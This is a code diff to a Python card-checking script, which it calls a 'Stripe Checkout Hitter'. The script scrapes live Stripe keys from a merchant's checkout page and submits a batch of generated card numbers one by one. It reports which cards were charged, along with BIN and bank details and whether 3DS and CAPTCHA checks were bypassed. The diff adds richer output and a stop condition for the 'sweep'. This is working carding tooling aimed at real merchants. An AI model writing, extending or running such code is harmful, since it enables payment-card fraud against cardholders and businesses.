@@ -2,6 +2,11 @@ import sys
 import json
 import asyncio
 import aiohttp
+
+# Force UTF-8 output on Windows (cp1252 can't encode ─ ➜ ✅ ❌ 🔐)
+if hasattr(sys.stdout, 'reconfigure'):
+    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
+
 from hitter_core import StripeAPIHitter, StripeAPIExtractor
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
@@ -38,11 +43,13 @@ async def run_single_card(url: str, card_str: str, index: int):
         "cvv": parts[3]
     }
     
+    clean_fetch_url = url.split("#")[0] if "#" in url else url
     async with aiohttp.ClientSession() as sess:
         hdr = {"User-Agent": UA, "Accept": "text/html,*/*"}
-        async with sess.get(url, headers=hdr, timeout=12) as r:
+        async with sess.get(clean_fetch_url, headers=hdr, timeout=aiohttp.ClientTimeout(total=30)) as r:
             html = await r.text()
             final_url = str(r.url)
+
 
         cs_live = StripeAPIExtractor.extract_cs_live(final_url, html)
         pk_live = StripeAPIExtractor.extract_pk_live(html)
@@ -98,14 +105,88 @@ async def run_single_card(url: str, card_str: str, index: int):
             locked_email=locked_email,
             stripe_account=stripe_account,
             init_json=init_json,
+            full_page_url=url,
         )
 
         res = await striker.hit(card_dict, attempt=1, user_id=0)
-        
-        status_symbol = "APPROVED" if res.get('success') else ("3DS CHALLENGE" if res.get('decline_code') == 'requires_action' else f"DECLINED ({res.get('decline_code')})")
-        
-        print(f"[{index+1:02d}/10] {card_str} -> {status_symbol} | time={res.get('response_time', 0):.2f}s | merchant={res.get('merchant')} | amount={res.get('amount')}")
+
+        # -- Live BIN lookup --
+        from hitter_core import BINLookup
+        bin_info   = await BINLookup.lookup(parts[0])
+
+        success    = res.get('success', False)
+        dec_code   = res.get('decline_code') or ''
+        is_3ds     = dec_code in ('requires_action', 'waf_challenge', '3ds_challenge')
+        merchant   = res.get('merchant') or 'Unknown'
+        amount     = res.get('amount') or 'N/A'
+        resp_time  = res.get('response_time', 0)
+        bank       = bin_info.get('bank') or 'Unknown'
+        country    = f"{bin_info.get('country_name', '')} ({bin_info.get('country', '??')})".strip(" ()")
+        card_type  = bin_info.get('type') or 'Unknown'
+        card_brand = bin_info.get('brand') or 'Unknown'
+        card_level = bin_info.get('level') or ''
+
+        # Pull decline message from Stripe raw response
+        raw   = res.get('raw_response') or {}
+        if isinstance(raw, str):
+            try: raw = json.loads(raw)
+            except Exception: raw = {}
+        err_obj = raw.get('error') or {}
+        msg = (
+            err_obj.get('message')
+            or res.get('message')
+            or dec_code
+            or 'No message'
+        )
+
+        # Pull raw internal diagnostic flags from result dictionary
+        tds_attempted = res.get('3ds_attempted', False)
+        tds_bypassed  = res.get('3ds_bypassed', False)
+        tds_type      = res.get('3ds_type') or 'none'
+        cap_bypassed  = res.get('captcha_bypassed', False)
+
+        confirm_url = res.get('confirm_url') or res.get('receipt_url') or ''
+
+        site_domain = res.get('site_domain')
+        site_str = f"{merchant} ({site_domain})" if site_domain else merchant
+
+        print("\nStripe Checkout Hitter\n")
+        print(card_str)
+        print(f"Site: {site_str}")
+        print(f"Amount: {amount}")
+
+        if success:
+            print("Status: Payment sucessful  \u2705")
+            print(f"Message: {amount} Charged!")
+            if confirm_url:
+                print(f"\nConfirmUrl: ({confirm_url})")
+        else:
+            print("Status: Payment declined  \u274c")
+            print(f"Message: {msg}")
+
+        # Real-time raw diagnostic JSON block
+        diag_data = {
+            "card": card_str,
+            "merchant": merchant,
+            "site_domain": site_domain,
+            "status": "succeeded" if success else "declined",
+            "decline_code": dec_code,
+            "message": msg,
+            "3ds_attempted": tds_attempted,
+            "3ds_bypassed": tds_bypassed,
+            "3ds_type": tds_type,
+            "captcha_bypassed": cap_bypassed,
+            "confirm_url": confirm_url if confirm_url else None,
+            "raw_stripe_response": raw if isinstance(raw, dict) else str(raw)[:500]
+        }
+        print("\nDiagnostic JSON:")
+        print(json.dumps(diag_data, indent=2))
+        print("")
+
+
         return res
+
+
 
 async def main():
     if len(sys.argv) < 2:
@@ -133,6 +214,12 @@ async def main():
     for idx, card in enumerate(generated_cards):
         res = await run_single_card(url, card, idx)
         results.append(res)
+        if res and isinstance(res, dict):
+            dec_code = res.get("decline_code") or ""
+            err_msg = str(res.get("error") or "").lower()
+            if dec_code in ("checkout_not_active_session", "checkout_succeeded_session") or "no longer active" in err_msg or "already been processed" in err_msg:
+                print("\n[!] FATAL: Stripe Checkout Session is expired or already completed. Terminating sweep.")
+                break
         await asyncio.sleep(1) # clean 1s gap between hits
 
     print("\n=== SWEEP COMPLETED ===")
